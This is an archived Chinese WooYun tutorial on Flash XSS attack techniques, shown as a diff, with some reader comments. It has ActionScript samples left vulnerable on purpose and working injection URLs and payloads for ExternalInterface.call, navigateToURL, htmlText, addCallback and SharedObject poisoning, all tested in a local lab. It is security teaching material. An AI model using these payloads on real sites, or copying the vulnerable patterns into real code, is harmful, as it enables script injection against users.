@@ -1,0 +1,231 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">常见Flash XSS攻击方式</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">MayIKissYou</a> <span class="bull">·</span> <time title="2014/09/03 11:30" ui-time="" datetime="2014/09/03 11:30" class="published ng-binding ng-isolate-scope">2014/09/03 11:30</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 HTML中嵌入FLASH</h2><hr><p>在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签，使用如下的代码进行嵌入：</p><p>IE下嵌入</p><pre><code>#!html
+&lt;object codeBase="http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"&gt;
+&lt;param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>非IE下嵌入</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="./trace.swf"&gt;
+&lt;param name="movie" value = "./trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>在插入Flash的过程中有两个重要的参数，allowScriptAccess和allowNetworking两个参数：</p><pre><code>allowScriptAccess：控制html页面与Flash页面的通讯。
+always：html和Flash页面的通讯不做任何的限制；
+samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；
+never：html和Flash禁止通讯。
+
+allowNetworking：控制Flash与外部的网络通讯。
+all：Flash所有的网络API通讯接口都可用；
+internal：navigateToURL，fscommand，ExternalInterface.call不可用；
+none：所有的网络API不可用。
+</code></pre><p>以chrome浏览器为例来验证以上参数，首先在本地搭建环境，并且新建一个Flash文件，Flash文件包括的内容主要是使用ExternalInterface.call执行力一个js语句，弹出当前域的域名。</p><p>1）：插入本地的Flash文件。</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="./trace.swf"&gt;
+&lt;param name="movie" value = "./trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>运行结果：</p><p><img alt="enter image description here" img-src="76c7cbedb0e4834185655c2041d37de869e03bef.jpg"></p><p>2）：插入本地的Flash，将allowScriptAccess参数改为samedomain。</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="./trace.swf"&gt;
+&lt;param name="movie" value = "./trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="samedomain" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+</code></pre><p>运行结果：</p><p><img alt="enter image description here" img-src="251049f23a2d690db503db020fa149d33acc5fe5.jpg"></p><p>Html界面与Flash属于同域，因此能够弹出。</p><p>3）：插入本地Flash，将allowScriptAccess改为never。</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="./trace.swf"&gt;
+&lt;param name="movie" value = "./trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="never" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>运行结果没有弹出。</p><p>4）：插入远程Flash，将allowScriptAccess改为always。</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf"&gt;
+&lt;param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>运行结果：</p><p><img alt="enter image description here" img-src="efaa2010ac8be11f9e07a06de7dd764c6fb309e1.jpg"></p><p>注意这里弹出的域为当前html的域名，非Flash的域。</p><p>5）：插入远程Flash，将allowScriptAccess改为samedomain</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf"&gt;
+&lt;param name="movie" value = "http://xxxx.sinaapp.com/trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="samedomain" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>运行结果没有弹出，因为Flash的域不和html在同一域内。</p><p>6）：插入远程Flash，将allowScriptAccess改为never</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf"&gt;
+&lt;param name="movie" value = "http://xxxxx.sinaapp.com/trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="never" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>运行结果没有弹出，由于禁止了与html界面通讯。</p><p>7）将allowScriptAccess置为always，将allowNetworking置为internal</p><pre><code>#!html
+&lt;object type="application/x-shockwave-Flash" data="http://xxxxx.sinaapp.com/trace.swf"&gt;
+&lt;param name="movie" value = "http://xxxxx.sinaapp.com/trace.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="internal" /&gt;
+</code></pre><p>运行结果没有弹出，allowNetworking的参数置为internal，禁止了接口ExternalInterface.all。</p><h2>0x02 Flash跨域请求</h2><hr><p>Flash跨域访问的时候主要受到crossdomain.xml文件的影响。crossdomain.xml文件严格遵循xml语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如： www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。 crossdomain.xml文件主要包含如下几个节点：</p><pre><code>site-control，allow-access-from，allow-access-from-identity，allow-http-request-headers-from
+</code></pre><p>常用的节点为allow-access-from【可能我见的少= =】，用来指明允许本域资源允许被哪些域名的Flash跨域请求。</p><p>例如下面为优酷的crossdomain.xml文件：</p><pre><code>#!html
+&lt;cross-domain-policy&gt;
+&lt;allow-access-from domain="*.youku.com"/&gt; //允许youku.com域名的Flash访问
+&lt;allow-access-from domain="*.ykimg.com"/&gt;
+&lt;allow-access-from domain="*.tudou.com"/&gt;
+&lt;allow-access-from domain="*.tudouui.com"/&gt;
+&lt;allow-access-from domain="*.tdimg.com"/&gt;
+&lt;/cross-domain-policy&gt;
+</code></pre><p>Ps.这个文件常常被用到Flash csrf中，当allow-access-from domain被设置为*后，可能存在Flash csrf的风险。</p><h2>0x03 常见Flash xss分类总结</h2><hr><p><strong>Flash缺陷参数-getURL</strong></p><p>Flash提供相关的函数，可以执行js代码，getURL【AS2中支持】，navigateToURL【AS3中支持】，ExternalInterface.call。 在wooyun中搜索到了一个相关实例：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-018472">WooYun: 久游网FLASH安全问题深入分析与利用(一)</a></p><p>本着学习的原则本地搭建实践了下： 本地新建了个Flash，Flash调用外部资源xml文件。 Flash代码：</p><pre><code>#!js
+var root_xml:XML = new XML();
+root_xml.ignoreWhite = true;
+root_xml.onLoad = function(success){
+    if(success){
+        getURL(root_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue)
+    }else{
+        getURL("javascript:alert(‘fail’)")
+    }
+}
+root_xml.load(_root.url);
+</code></pre><p>xml文件：</p><pre><code>#!html
+&lt;?xml version="1.0" encoding="utf-8" ?&gt;
+&lt;data&gt;
+    &lt;link&gt;javascript:alert('xss')&lt;/link&gt;
+&lt;/data&gt;
+</code></pre><p>运行结果：</p><p><img alt="enter image description here" img-src="6c533f2d63c31c03769cd92fefc253749d13a764.jpg"></p><p>Ps.此类问题一般可以使用google搜索xml文件被swf调用的情况，传入的内容如果没做过滤，很可能出现此类问题。</p><p><strong>Flash缺陷参数-navigateToURL</strong></p><hr><p>上例中getURL（）为AS2中的方法，在AS3中使用的是navigateToURL，wooyun中上报过此参数导致Flash xss的实例。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-016512">WooYun: [腾讯实例教程] 那些年我们一起学XSS - 14. Flash Xss入门 [navigateToURL]</a></p><p>此类问题原理一般是由于调用了的资源文件（如xml）可被攻击者控制，导致了Flash xss。</p><p>本着学习的原则，本地搭建实践了下： Flash文件：</p><pre><code>#!as3
+var url:String = stage.loaderInfo.parameters.url
+var req:URLRequest = new URLRequest("a.xml");
+var ld:URLLoader = new URLLoader();
+ld.addEventListener(Event.COMPLETE ,ok);
+function ok(evtObj:Event):void {
+    if(ld.data){
+        navigateToURL(new URLRequest(url),'_self')
+    } else {        
+    }
+}
+ld.load(req)
+</code></pre><p>大致意思就是从外部获取了一个参数，通过navigateToURL调用。</p><p>运行结果：</p><p><img alt="enter image description here" img-src="33f93de920c8bd1239f9e15f0b651a80efed9200.jpg"></p><p><strong>Flash缺陷参数-ExternalInterface.call(参数一)</strong></p><p>ExternalInterface.call同样是一个Flash提供的可以执行js的接口函数， ExternalInterface.call函数有两个参数，形如ExternalInterface.call("函数名","参数1")。</p><p>Flash最后执行的JS代码如下：</p><pre><code>#!as3
+try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "&lt;undefined/&gt;"; }
+</code></pre><p>此段先考虑参数1，即函数名。</p><p>Wooyun上相关的实例有：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-016532">WooYun: [腾讯实例教程] 那些年我们一起学XSS - 15. Flash Xss进阶 [ExternalInterface.call第一个参数]</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-017013">WooYun: Flash应用安全系列[1]--360反射型跨站</a></p><p>这两篇都写的很详细。</p><p>本着学习的原则，本地搭建实践了下： Flash文件：</p><pre><code>#!as3
+var a:String = root.loaderInfo.parameters.func
+if(ExternalInterface.available){
+    ExternalInterface.call(a)
+} else {
+    trace(100)
+}
+stop()
+</code></pre><p>从外部获取参数func，使用ExternalInterface.call接收第一个参数，执行。</p><p>对比：</p><pre><code>#!as3
+try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "&lt;undefined/&gt;"; }
+</code></pre><p>创建url：</p><pre><code>http://192.168.4.70/ExternalInterface_first.swf?func=alert(1))}catch(e){alert(100)}//
+</code></pre><p>这样实际执行的js代码为：</p><pre><code>#!as3
+try { __Flash__toXML(alert(1))}catch(e){alert(100)}// ("参数1")) ; } catch (e) { "&lt;undefined/&gt;"; }
+
+http://192.168.4.70/ExternalInterface_first.swf?func=a1lert(1))}catch(e){alert(100)}//
+
+try { __Flash__toXML(a1lert(1))}catch(e){alert(100)}// ("参数1")) ; } catch (e) { "&lt;undefined/&gt;"; }
+</code></pre><p>预期结果应该是第一个url执行之后弹出数字1，第二个url执行之后弹出数字100。 访问</p><pre><code>http://192.168.4.70/ExternalInterface_first.swf?func=alert(1))}catch(e){alert(100)}//
+</code></pre><p><img alt="enter image description here" img-src="a4c2d58feb62e48c39edc4759fdf5d90c9945cf2.jpg"></p><p>访问</p><pre><code>http://192.168.4.70/ExternalInterface_first.swf?func=a1lert(1))}catch(e){alert(100)}//
+</code></pre><p><img alt="enter image description here" img-src="cc17348d72283f209ed19c0d9d235268018b6825.jpg"></p><p>和预期结果一样。</p><p><strong>Flash缺陷参数-ExternalInterface.call(参数二)</strong></p><p>有时候当反编译swf之后，会发现可控的参数的输出位置在ExternalInterface.call函数的第二个参数，方法和思路与第一个参数的时候类似。</p><p>Wooyun里面相关的例子：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-016598">WooYun: [腾讯实例教程] 那些年我们一起学XSS - 16. Flash Xss进阶 [ExternalInterface.call第二个参数]</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-017189">WooYun: Flash应用安全系列[3]--WordPress反射型跨站(0day)</a></p><p>Flash文件：</p><pre><code>#!as3
+var a:String = root.loaderInfo.parameters.par
+if(ExternalInterface.available){
+    ExternalInterface.call("alert",a)
+} else {
+    trace(100)
+}
+stop()
+</code></pre><p>Flash文件中的a是从外部获取的参数，此处外部获取的参数par赋值给了a，作为输出点输出到了ExternalInterface的第二个参数的位置，此处相对于第一个参数的不同之处是，此处的输出点在引号中，因此此处我们需要把引号闭合掉。根据上面两边文章，可以发现闭合引号使用的方法是\”这样会被转义为\”，”就被吃掉了。</p><p>根据ExternalInterface.call的调用原型：</p><pre><code>#!as3
+try { __Flash__toXML(函数名("参数1")) ; } catch (e) { "&lt;undefined/&gt;"; }
+</code></pre><p>我们将参数输入如下的url：</p><pre><code>http://192.168.4.70/ExternalInterface_second.swf?par=1111\%22),al)}catch(e){alert(1000)}//
+</code></pre><p>分析应该执行如下：</p><pre><code>#!as3
+try{
+  __Flash__toXML(alert(“1111\\”),al
+}
+catch(e){
+  alert(1000)
+}
+</code></pre><p>如此下来应该就会弹出两个框，一个为1111\，另外一个为1000。 运行结果，弹出1111\：</p><p><img alt="enter image description here" img-src="61c8d2a338b17fc7377b5ce40f3ad223053a1d1a.jpg"></p><p>点击确定，弹出1000：</p><p><img alt="enter image description here" img-src="86d13048d8fc00099254fa280127a42abcffc240.jpg"></p><p>Ps. 此处ExternalInterface.call调用的函数名，编写Flash的时候设置了alert，因此此处会弹两次，一般情况下，函数名是不能够被控制，这样我们使得，前面的函数执行异常，执行catch中的js即可。</p><p><strong>Flash缺陷参数-htmlText</strong></p><p>Flash支持在Flash里内嵌html，支持的标签img标签，a标签等。 img标签可以通过src参数引入一个Flash文件，类似与XSF一样。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-017699">WooYun: Flash应用安全系列[6]--新浪微博蠕虫威胁</a></p><p>文档写的很详细，推荐阅读。 本着学习的原则，本地创建了Flash文件，</p><pre><code>#!as3
+import fl.controls.TextArea;
+var a:String = root.loaderInfo.parameters.url
+var t:TextArea = new TextArea()
+t.width = 500
+t.height = 300
+t.htmlText += a
+addChild(t)
+</code></pre><p>从获取URL中的参数url，赋值给a，变量a直接输出到了Textarea t中。 访问如下url：</p><pre><code>http://192.168.4.70/htmltext.swf?url=%3Cimg%20src=%27./trace.swf%27%3E
+</code></pre><p>访问结果如下：</p><p><img alt="enter image description here" img-src="99cb20682c95c7f91730a4c2524283f093ea5be7.jpg"></p><p>Ps.当反编译Flash文件，发现htmltext输出点的时候，可以查看相关是否存在相关的可控的输入，可能存在xss。 Flash缺陷参数object的id可控 html与swf通讯的时候，使用的是ExternalInterface.addCallback函数，调用如下：</p><pre><code>#!as3
+function a(){
+  trace(“hi”);
+}
+ExternalInterface.addCallback(“test”,a);
+</code></pre><p>执行了函数之后，在html上可以通过使用函数名test来调用Flash中的函数a。</p><p>addCallback的原理：</p><pre><code>#!as3
+if ((((activeX == true)) &amp;&amp; (!((objectID == null))))){
+
+    _evalJS((((("__Flash__addCallback(document.getElementById(\"" + objectID) + "\"), \"") + functionName) + "\");"));
+
+};
+</code></pre><p>objectID为Flash的id，functionName为函数名称，因此当我们插入的Flash的id可控的时候，可能会出现xss问题。</p><p>Wooyun上已经出现的类似问题：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-016803">WooYun: [腾讯实例教程] 那些年我们一起学XSS - 21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-017309">WooYun: Flash应用安全系列[4]--Flash Player的又一个0day</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-021020">WooYun: QQ空间某功能缺陷导致日志存储型XSS - 12</a></p><p>本着学习的原则，本地创建了Flash文件，</p><pre><code>#!as3
+function a(){
+    trace("hi")
+}
+ExternalInterface.addCallback("test",a)
+</code></pre><p>x.html页面</p><pre><code>#!html
+&lt;object id="addcallback,&amp;quot;),(function(){if(!window.x){window.x=1;alert(1)}})(),(&amp;quot;" codeBase="http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"&gt;
+&lt;param name="movie" value = "./addCallback.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+</code></pre><p>访问该界面（IE8下测试）：</p><p><img alt="enter image description here" img-src="f110ca87afc1e068aca56fb94afc4efef91dea80.jpg"></p><p><strong>Flash缺陷参数addcallback与lso结合</strong></p><p>这个问题出现的点在addCallback声明的函数，在被html界面js执行之后的返回值攻击者可控，导致了xss问题。使用lso中首先会setlso，写入脏数据，然后getlso获取脏数据。</p><p>Wooyun实例链接：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-039481">WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-040838">WooYun: 一个flash的0day导致的淘宝网存储xss 【续集】</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-051615">WooYun: 一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-054102">WooYun: 我是如何实现批量种植rootkit窃取阿里云账号密码的</a></p><p>drops下相关资料：</p><p><a href="http://drops.wooyun.org/papers/1426">一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）</a></p><p>本着学习的原则，本地创建了Flash文件，</p><pre><code>#!as3
+function setlso(_arg1:String):Boolean{
+    var _local2:SharedObject = SharedObject.getLocal("kj");
+    _local2.data.key = _arg1;
+    _local2.flush();
+    return (true);
+}
+
+function getlso():String{
+    var _local1:SharedObject = SharedObject.getLocal("kj");
+    if(_local1.data.key == undefined){
+        return ("");
+    }
+    return (_local1.data.key);
+}
+ExternalInterface.addCallback("getlso",getlso)
+ExternalInterface.addCallback("setlso",setlso)
+</code></pre><p>x.html</p><pre><code>#!html
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;object id="lso" type="application/x-shockwave-Flash" data="http://192.168.4.70/addCallback_lso.swf"&gt;
+&lt;param name="movie" value = "http://192.168.4.70/addCallback_lso.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;/object&gt;
+&lt;script&gt;
+function set(){
+    document["lso"].setlso('aa\\";alert(document.domain);//aa');
+}
+function get(){
+    document["lso"].getlso();
+}
+
+setTimeout("get()",5000)
+setTimeout("get()",7000)
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>运行结果：</p><p><img alt="enter image description here" img-src="19d7c58dce945682835ce95a03d70e3f88fcc86c.jpg"></p><p><strong>跨站Flash</strong></p><p>跨站Flash即XSF，通过AS加载第三方的Flash文件，如果这个第三方Flash可以被控制，就可以实现XSF。 在AS2中使用loadMove函数等加载第三方Flash。</p><pre><code>#!as3
+_root.loadMovie(swf)；
+</code></pre><p>在AS3中使用Loader类进行外部数据处理：</p><pre><code>#!as3
+var param:Object = root.loaderInfo.parameters;
+var swf:String = param[“swf”];
+var myLoader:Loader = new Loader();
+var url:URLRequest = new URLRequest(swf);
+myLoader.load(url);
+addChild(myLoader);
+</code></pre><p>wooyun上实例：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-01768">WooYun: sina微薄存储型跨站</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-01904">WooYun: sina微博存储型跨站Ⅱ</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-03574">WooYun: sina微博存储型跨站Ⅲ</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-08354">WooYun: 百度贴吧存储型XSS - Flash又中枪了～～</a></p><p>本地搭建环境，新建Flash：</p><pre><code>#!as3
+var param:Object = root.loaderInfo.parameters;
+var swf:String = param["swf"];
+var myLoader:Loader = new Loader();
+var url:URLRequest = new URLRequest(swf);
+myLoader.load(url);
+addChild(myLoader);
+</code></pre><p>新建本地html文件：</p><pre><code>#!html
+&lt;object id="lso" type="application/x-shockwave-Flash" data="http://192.168.4.70/xsf.swf"&gt;
+&lt;param name="movie" value = "http://192.168.4.70/xsf.swf" /&gt;
+&lt;param name="allowScriptAccess" value="always" /&gt;
+&lt;param name="allowNetworking" value="all" /&gt;
+&lt;param name="Flashvars" value="swf=http://xxxxx.sinaapp.com/trace.swf"
+&lt;/object&gt;
+</code></pre><p>运行结果，加载了远程有缺陷的swf文件导致了xsf。</p><p><img alt="enter image description here" img-src="f21668c8d523a5017c012e06952dd8f93075c6c0.jpg"></p><p><strong>其他</strong></p><p>1：addCallback返回值从其他地方获取。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-051432">WooYun: QQ空间某功能缺陷导致日志存储型XSS - 14</a></p><p>2：利用上传文件如xx.swf修改为xx.jpg获得上传目标域下的swf。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-017459">WooYun: Flash应用安全系列[5]--QQ邮箱永久劫持漏洞</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-062461">WooYun: 腾讯某分站可上传任意swf文件导致的一系列问题（附简单POC）</a></p><p>drops相关链接：</p><p><a href="http://drops.wooyun.org/tips/2031">上传文件的陷阱</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20150317130223f1458003feca61081e0fc6750ace16e8.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BeenQuiver</span> <span class="reply-time">2016-04-18 10:33:33</span></div><p></p><p>厉害啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">楊铣僧</span> <span class="reply-time">2015-04-17 16:49:07</span></div><p></p><p>全是精华！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">aaab</span> <span class="reply-time">2015-02-27 13:54:56</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">do9gy</span> <span class="reply-time">2015-01-14 16:46:17</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GrayTrack</span> <span class="reply-time">2014-09-16 00:53:26</span></div><p></p><p>好帖</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小r00to1</span> <span class="reply-time">2014-09-04 10:02:14</span></div><p></p><p>nice'</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cooFool</span> <span class="reply-time">2014-09-03 15:48:46</span></div><p></p><p>g+</p><p></p></div></div></div></div></div></main>
